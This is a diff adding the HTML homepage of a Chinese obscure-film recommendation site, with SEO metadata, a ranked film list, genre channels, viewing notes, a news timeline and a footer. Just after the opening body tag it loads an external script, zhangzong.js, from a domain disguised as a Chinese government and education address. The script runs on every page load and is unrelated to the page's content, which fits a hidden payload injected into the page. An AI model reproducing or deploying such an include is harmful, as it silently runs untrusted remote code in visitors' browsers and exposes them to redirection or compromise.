@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>奇特电影网 | 冷门神作与全球奇片 · 发现不一样的电影</title>
+<meta name="description" content="奇特电影网专注发掘全球冷门神作、邪典电影与奇片怪作，带你避开烂片雷区，挖掘那些评分被低估的罕见佳作。每周更新奇特片单，让观影不再千篇一律。">
+<meta name="keywords" content="奇特电影网,冷门电影,邪典电影,全球奇片,罕见佳作,小众电影推荐,高分冷门,电影挖掘">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="revisit-after" content="7 days">
+<meta property="og:title" content="奇特电影网 - 冷门神作与全球奇片">
+<meta property="og:description" content="发掘被低估的罕见佳作，避开烂片雷区，让观影不再千篇一律。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://qitedianyingwang-zh.github.io">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://qitedianyingwang-zh.github.io">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#14110f;--paper:#f6f1e7;--paper2:#efe7d6;--card:#fffdf8;--green:#2f5d3a;--green2:#4a8a5a;--rust:#a8442f;--gold:#c9962c;--muted:#7a7164;--line:#ddd2bd;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Georgia","Songti SC","SimSun",serif;background:var(--paper);color:var(--ink);line-height:1.75;font-size:16px}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+
+/* 顶部 */
+.topbar{background:var(--green);color:#f4efe3;font-size:13px;padding:8px 0}
+.topbar .wrap{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.topbar span{opacity:.85}
+header{background:var(--paper);border-bottom:3px double var(--green);position:sticky;top:0;z-index:40}
+.head-in{display:flex;align-items:center;justify-content:space-between;padding:20px 0}
+.brand h1{font-size:30px;letter-spacing:2px;font-weight:900}
+.brand h1 small{display:block;font-size:11px;letter-spacing:6px;color:var(--green);font-weight:400;margin-top:2px}
+.search{display:flex;border:2px solid var(--green);border-radius:4px;overflow:hidden;width:300px}
+.search input{flex:1;border:none;background:var(--card);padding:9px 12px;font-family:inherit;font-size:14px;outline:none}
+.search button{border:none;background:var(--green);color:#fff;padding:0 18px;cursor:pointer;font-size:14px;letter-spacing:2px}
+.menubtn{display:none;background:none;border:none;font-size:26px;cursor:pointer;color:var(--green)}
+nav.crumbs{background:var(--ink);padding:0}
+nav.crumbs .wrap{display:flex;gap:0;flex-wrap:wrap}
+nav.crumbs a{padding:13px 20px;color:#ddd2bd;font-size:14px;letter-spacing:1px;transition:.2s;border-right:1px solid rgba(255,255,255,.08)}
+nav.crumbs a:hover{background:var(--rust);color:#fff}
+
+/* 布局 */
+.layout{display:grid;grid-template-columns:1fr 320px;gap:34px;padding:44px 0}
+main{min-width:0}
+aside{min-width:0}
+
+/* 栏目通用 */
+.col{margin-bottom:50px}
+.col-head{display:flex;align-items:center;gap:14px;margin-bottom:22px;padding-bottom:12px;border-bottom:1px solid var(--line)}
+.col-head .no{background:var(--green);color:#fff;width:34px;height:34px;display:grid;place-items:center;font-size:15px;font-weight:700;flex-shrink:0}
+.col-head h2{font-size:23px;font-weight:900;letter-spacing:1px}
+.col-head h2 em{font-style:normal;color:var(--rust)}
+.col-head .sub{margin-left:auto;font-size:13px;color:var(--muted)}
+.col-head .sub a:hover{color:var(--rust)}
+
+/* 导语 */
+.intro{font-size:15px;color:var(--muted);margin-bottom:24px;padding:16px 20px;background:var(--paper2);border-left:4px solid var(--gold)}
+
+/* 奇特片单表格 */
+table.list{width:100%;border-collapse:collapse;background:var(--card);font-size:14px;font-family:-apple-system,"PingFang SC",sans-serif}
+table.list th{background:var(--green);color:#fff;padding:11px 12px;text-align:left;font-weight:600;font-size:13px;letter-spacing:1px}
+table.list td{padding:12px;border-bottom:1px solid var(--line);vertical-align:middle}
+table.list tr:hover td{background:var(--paper2)}
+table.list .rk{font-weight:700;color:var(--rust);width:40px;text-align:center}
+table.list .yr{color:var(--muted);width:60px}
+table.list .tg{width:80px}
+table.list .tg span{background:var(--paper2);border:1px solid var(--line);padding:2px 8px;border-radius:3px;font-size:12px;white-space:nowrap}
+table.list .sc{width:56px;color:var(--gold);font-weight:700}
+table.list .more{width:70px;text-align:right;color:var(--green);font-size:13px}
+
+/* 分类卡片 */
+.cats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px}
+.cat{background:var(--card);border:1px solid var(--line);padding:24px 20px;position:relative;transition:.3s;overflow:hidden}
+.cat::after{content:"";position:absolute;left:0;bottom:0;width:0;height:3px;background:var(--rust);transition:.3s}
+.cat:hover{transform:translateY(-4px);box-shadow:0 10px 26px rgba(20,17,15,.1)}
+.cat:hover::after{width:100%}
+.cat .badge{font-size:11px;letter-spacing:2px;color:var(--green);margin-bottom:8px;display:block}
+.cat h3{font-size:18px;margin-bottom:6px}
+.cat p{font-size:13px;color:var(--muted);font-family:-apple-system,"PingFang SC",sans-serif}
+.cat .cnt{margin-top:14px;padding-top:12px;border-top:1px dashed var(--line);font-size:12px;color:var(--rust)}
+
+/* 观影手记 */
+.notes{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+.note{background:var(--card);border-top:5px solid var(--gold);padding:22px;box-shadow:0 2px 10px rgba(20,17,15,.04)}
+.note .quote{font-size:13px;color:var(--rust);letter-spacing:1px;margin-bottom:10px}
+.note h4{font-size:17px;margin-bottom:8px}
+.note p{font-size:14px;color:#4a4238;font-family:-apple-system,"PingFang SC",sans-serif}
+.note .by{margin-top:16px;padding-top:12px;border-top:1px solid var(--line);font-size:12px;color:var(--muted)}
+
+/* 行业动态时间线 */
+.timeline{position:relative;padding-left:28px}
+.timeline::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:var(--line)}
+.tl{position:relative;padding:0 0 22px 18px}
+.tl::before{content:"";position:absolute;left:-26px;top:7px;width:12px;height:12px;border-radius:50%;background:var(--green);border:3px solid var(--paper)}
+.tl .d{font-size:12px;color:var(--rust);letter-spacing:1px;margin-bottom:3px}
+.tl h4{font-size:15px;margin-bottom:4px}
+.tl p{font-size:13px;color:var(--muted);font-family:-apple-system,"PingFang SC",sans-serif}
+
+/* 侧边栏 */
+.box{background:var(--card);border:1px solid var(--line);padding:22px;margin-bottom:26px}
+.box h3{font-size:17px;margin-bottom:16px;padding-bottom:10px;border-bottom:2px solid var(--green);display:flex;justify-content:space-between;align-items:baseline}
+.box h3 span{font-size:11px;color:var(--muted);font-weight:400;letter-spacing:1px}
+.tops li{list-style:none;display:flex;gap:12px;padding:10px 0;border-bottom:1px dotted var(--line);font-size:14px;align-items:flex-start}
+.tops li:last-child{border-bottom:none}
+.tops .i{flex-shrink:0;width:24px;height:24px;background:var(--ink);color:#fff;font-size:12px;display:grid;place-items:center;font-weight:700}
+.tops li:nth-child(1) .i{background:var(--gold)}.tops li:nth-child(2) .i{background:var(--rust)}
+.tagcloud{display:flex;flex-wrap:wrap;gap:8px}
+.tagcloud a{font-size:13px;border:1px solid var(--line);padding:5px 11px;background:var(--paper2);transition:.2s}
+.tagcloud a:hover{border-color:var(--rust);color:var(--rust)}
+.fact p{font-size:14px;color:#4a4238;margin-bottom:12px}
+.fact .big{font-size:32px;font-weight:900;color:var(--green)}
+.domain-side{border:2px dashed var(--green);padding:16px;text-align:center}
+.domain-side b{display:block;font-size:11px;letter-spacing:3px;color:var(--muted);margin-bottom:8px}
+.domain-side a{font-size:15px;font-weight:700;color:var(--rust);word-break:break-all}
+
+/* 页脚 */
+footer{background:var(--ink);color:#b9ae9b;padding:50px 0 0}
+.foot-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:30px;margin-bottom:36px}
+.foot-grid h4{color:#fff;font-size:16px;margin-bottom:16px;letter-spacing:1px}
+.foot-grid ul{list-style:none}
+.foot-grid li{padding:5px 0;font-size:13px}
+.foot-grid a:hover{color:var(--gold)}
+.foot-grid p{font-size:13px;line-height:1.9}
+.foot-bot{border-top:1px solid rgba(255,255,255,.1);padding:20px 0;font-size:12px;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+/* 响应式 */
+@media(max-width:960px){
+  .layout{grid-template-columns:1fr;gap:20px;padding:28px 0}
+  .menubtn{display:block}
+  nav.crumbs .wrap{flex-direction:column}
+  nav.crumbs a{border-right:none;border-bottom:1px solid rgba(255,255,255,.08)}
+  nav.crumbs{display:none}
+  nav.crumbs.show{display:block}
+  .head-in{flex-wrap:wrap;gap:14px}
+  .search{width:100%;order:3}
+  .brand h1{font-size:24px}
+  .col-head h2{font-size:19px}
+  table.list{font-size:13px}
+  table.list th,table.list td{padding:9px 8px}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:560px){
+  .wrap{padding:0 16px}
+  .topbar .wrap span:last-child{display:none}
+  .foot-grid{grid-template-columns:1fr}
+  .intro{font-size:14px;padding:14px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span>🎬 每天发现一部你可能错过的奇特好片</span>
+    <span>qitedianyingwang-zh.github.io</span>
+  </div>
+</div>
+
+<header>
+  <div class="wrap head-in">
+    <div class="brand">
+      <h1>奇特电影网<small>RARE · WEIRD · WONDERFUL FILMS</small></h1>
+    </div>
+    <form class="search" onsubmit="return false">
+      <input type="text" placeholder="搜索冷门片名 / 导演 / 类型">
+      <button>搜索</button>
+    </form>
+    <button class="menubtn" onclick="document.getElementById('nav').classList.toggle('show')">☰</button>
+  </div>
+  <nav class="crumbs" id="nav">
+    <div class="wrap">
+      <a href="#top">首页</a>
+      <a href="#odd">奇特片单</a>
+      <a href="#cat">类型频道</a>
+      <a href="#note">观影手记</a>
+      <a href="#news">行业动态</a>
+      <a href="#about">关于本站</a>
+    </div>
+  </nav>
+</header>
+
+<div class="wrap layout">
+  <main id="top">
+
+    <!-- 导语 -->
+    <div class="col">
+      <div class="intro">
+        奇特电影网不做烂片搬运工。我们只关心那些<strong>评分被低估、题材够罕见、看完让人忍不住跟朋友聊上三天</strong>的电影。从邪典经典到冷门新作，从跨文化奇观到小众作者表达，这里是一份拒绝平庸的私人观影地图。
+      </div>
+    </div>
+
+    <!-- 栏目1 奇特片单 -->
+    <section class="col" id="odd">
+      <div class="col-head">
+        <span class="no">1</span>
+        <h2>本周<em>奇特片单</em></h2>
+        <span class="sub"><a href="#">查看完整片单 ›</a></span>
+      </div>
+      <table class="list">
+        <thead>
+          <tr><th>排名</th><th>片名</th><th>年份</th><th>类型</th><th>评分</th><th></th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="rk">01</td><td><a href="#">寂静岭之外的时间褶皱</a></td><td class="yr">2024</td><td class="tg"><span>心理悬疑</span></td><td class="sc">8.9</td><td class="more"><a href="#">详情</a></td></tr>
+          <tr><td class="rk">02</td><td><a href="#">用左手弹琴的邮差</a></td><td class="yr">2023</td><td class="tg"><span>文艺治愈</span></td><td class="sc">8.6</td><td class="more"><a href="#">详情</a></td></tr>
+          <tr><td class="rk">03</td><td><a href="#">冰箱里住着一条鱼</a></td><td class="yr">2025</td><td class="tg"><span>荒诞喜剧</span></td><td class="sc">8.3</td><td class="more"><a href="#">详情</a></td></tr>
+          <tr><td class="rk">04</td><td><a href="#">第两百次日落</a></td><td class="yr">2024</td><td class="tg"><span>软科幻</span></td><td class="sc">8.7</td><td class="more"><a href="#">详情</a></td></tr>
+          <tr><td class="rk">05</td><td><a href="#">无人认领的行李</a></td><td class="yr">2022</td><td class="tg"><span>犯罪剧情</span></td><td class="sc">8.4</td><td class="more"><a href="#">详情</a></td></tr>
+          <tr><td class="rk">06</td><td><a href="#">三只猫与一座空城</a></td><td class="yr">2025</td><td class="tg"><span>实验动画</span></td><td class="sc">8.5</td><td class="more"><a href="#">详情</a></td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <!-- 栏目2 类型频道 -->
+    <section class="col" id="cat">
+      <div class="col-head">
+        <span class="no">2</span>
+        <h2>类型<em>频道</em></h2>
+        <span class="sub"><a href="#">全部类型 ›</a></span>
+      </div>
+      <div class="cats">
+        <a href="#" class="cat"><span class="badge">CHANNEL 01</span><h3>邪典 Cult</h3><p>挑战认知边界的cult经典，越看越上头。</p><div class="cnt">128 部片源</div></a>
+        <a href="#" class="cat"><span class="badge">CHANNEL 02</span><h3>冷门神作</h3><p>口碑极高却没人看过的隐藏宝藏。</p><div class="cnt">96 部片源</div></a>
+        <a href="#" class="cat"><span class="badge">CHANNEL 03</span><h3>跨文化奇观</h3><p>来自东南亚、拉美、东欧的影像惊喜。</p><div class="cnt">74 部片源</div></a>
+        <a href="#" class="cat"><span class="badge">CHANNEL 04</span><h3>作者电影</h3><p>风格鲜明的导演个人表达与小众作者。</p><div class="cnt">63 部片源</div></a>
+        <a href="#" class="cat"><span class="badge">CHANNEL 05</span><h3>奇幻荒诞</h3><p>设定离谱却意外好看的脑洞作品。</p><div class="cnt">57 部片源</div></a>
+        <a href="#" class="cat"><span class="badge">CHANNEL 06</span><h3>纪录异闻</h3><p>真实世界里那些比电影更离奇的故事。</p><div class="cnt">49 部片源</div></a>
+      </div>
+    </section>
+
+    <!-- 栏目3 观影手记 -->
+    <section class="col" id="note">
+      <div class="col-head">
+        <span class="no">3</span>
+        <h2>观影<em>手记</em></h2>
+        <span class="sub"><a href="#">我要写手记 ›</a></span>
+      </div>
+      <div class="notes">
+        <article class="note">
+          <div class="quote">"看完沉默了很久，不知道该推荐还是该劝阻。"</div>
+          <h4>《寂静岭之外的时间褶皱》为什么值得一看</h4>
+          <p>它没有用任何jump scare，却让整场观众从头紧绷到尾。导演把时间当成可折叠的布料，越往后看越觉得后背发凉。建议不要查剧透直接看。</p>
+          <div class="by">— 手记人：老周 · 10月1日</div>
+        </article>
+        <article class="note">
+          <div class="quote">"荒诞到极致，反而治愈了周一早上的焦虑。"</div>
+          <h4>《冰箱里住着一条鱼》到底在讲什么</h4>
+          <p>如果你最近心情不太好，这部片子会让你笑着笑着眼眶就红了。它讲的不是鱼，是那些被我们塞进冰箱里、假装忘记的生活碎片。</p>
+          <div class="by">— 手记人：小满 · 9月28日</div>
+        </article>
+        <article class="note">
+          <div class="quote">"小成本做出来的质感，完胜一堆大制作。"</div>
+          <h4>为什么我们要关注这些"奇特电影"</h4>
+          <p>大银幕上的爆米花片看多了容易腻。这些奇特电影也许制作不豪华，但每一部都有自己不肯妥协的表达，这才是电影最迷人的地方。</p>
+          <div class="by">— 手记人：阿ken · 9月22日</div>
+        </article>
+      </div>
+    </section>
+
+    <!-- 栏目4 行业动态 -->
+    <section class="col" id="news">
+      <div class="col-head">
+        <span class="no">4</span>
+        <h2>行业<em>动态</em></h2>
+        <span class="sub"><a href="#">更多资讯 ›</a></span>
+      </div>
+      <div class="timeline">
+        <div class="tl"><div class="d">2026 · 10 · 02</div><h4>小成本独立电影票房逆袭，奇特题材正在被看见</h4><p>多部低成本奇特题材作品口碑发酵，引发业内对"小众内容市场"的新一轮讨论。</p></div>
+        <div class="tl"><div class="d">2026 · 09 · 26</div><h4>年度邪典电影节片单公布，12部冷门佳作入选</h4><p>涵盖实验短片、跨文化剧情片与纪录异闻，完整片单已同步至本站片库。</p></div>
+        <div class="tl"><div class="d">2026 · 09 · 18</div><h4>流媒体平台加码小众内容，作者电影迎来新窗口</h4><p>多家平台公布小众片采购计划，更多此前难以在大银幕看到的奇特作品将上线。</p></div>
+        <div class="tl"><div class="d">2026 · 09 · 10</div><h4>本站片单系统升级，支持按"离谱程度"筛选</h4><p>新增题材标签与筛选维度，找片效率大幅提升，欢迎体验后反馈建议。</p></div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- 侧边栏 -->
+  <aside>
+    <div class="box">
+      <h3>热门排行 <span>TOP 5</span></h3>
+      <ul class="tops">
+        <li><span class="i">1</span><span><a href="#">寂静岭之外的时间褶皱</a><br><small style="color:var(--muted)">心理悬疑 · 8.9</small></span></li>
+        <li><span class="i">2</span><span><a href="#">第两百次日落</a><br><small style="color:var(--muted)">软科幻 · 8.7</small></span></li>
+        <li><span class="i">3</span><span><a href="#">用左手弹琴的邮差</a><br><small style="color:var(--muted)">文艺治愈 · 8.6</small></span></li>
+        <li><span class="i">4</span><span><a href="#">三只猫与一座空城</a><br><small style="color:var(--muted)">实验动画 · 8.5</small></span></li>
+        <li><span class="i">5</span><span><a href="#">无人认领的行李</a><br><small style="color:var(--muted)">犯罪剧情 · 8.4</small></span></li>
+      </ul>
+    </div>
+
+    <div class="box">
+      <h3>关键词云</h3>
+      <div class="tagcloud">
+        <a href="#">冷门神作</a><a href="#">邪典cult</a><a href="#">烧脑反转</a><a href="#">跨文化</a><a href="#">实验短片</a><a href="#">治愈系</a><a href="#">荒诞喜剧</a><a href="#">东欧电影</a><a href="#">亚洲新片</a><a href="#">作者表达</a><a href="#">纪录异闻</a>
+      </div>
+    </div>
+
+    <div class="box fact">
+      <h3>奇特档案</h3>
+      <p><span class="big">1286</span> 部已收录奇特影片</p>
+      <p><span class="big">47</span> 个国家与地区的片源覆盖</p>
+      <p><span class="big">92%</span> 用户表示"发现了以前没注意的好片"</p>
+    </div>
+
+    <div class="box">
+      <h3>官方站点</h3>
+      <div class="domain-side">
+        <b>WEBSITE DOMAIN</b>
+        <a href="https://qitedianyingwang-zh.github.io">qitedianyingwang-zh.github.io</a>
+      </div>
+    </div>
+  </aside>
+</div>
+
+<footer id="about">
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h4>奇特电影网</h4>
+        <p>专注发掘冷门神作与全球奇片，拒绝平庸的私人观影地图。让每一部被低估的好电影都被看见。</p>
+      </div>
+      <div>
+        <h4>影片栏目</h4>
+        <ul>
+          <li><a href="#odd">本周奇特片单</a></li>
+          <li><a href="#cat">类型频道</a></li>
+          <li><a href="#note">观影手记</a></li>
+          <li><a href="#news">行业动态</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#">编辑团队</a></li>
+          <li><a href="#">投稿与约稿</a></li>
+          <li><a href="#">版权声明</a></li>
+          <li><a href="#">联系合作</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>访问入口</h4>
+        <ul>
+          <li><a href="https://qitedianyingwang-zh.github.io">qitedianyingwang-zh.github.io</a></li>
+          <li><a href="#">站内地图</a></li>
+          <li><a href="#">免责声明</a></li>
+          <li><a href="#">隐私政策</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-bot">
+      <span>© 2026 奇特电影网 qitedianyingwang-zh.github.io · 挖掘被低估的好电影</span>
+      <span>用心看片，拒绝烂片</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('click',function(e){
+  var nav=document.getElementById('nav');
+  if(window.innerWidth<=900 && !nav.contains(e.target) && !e.target.classList.contains('menubtn')){
+    nav.classList.remove('show');
+  }
+});
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('show');});
+});
+</script>
+</body>
+</html>
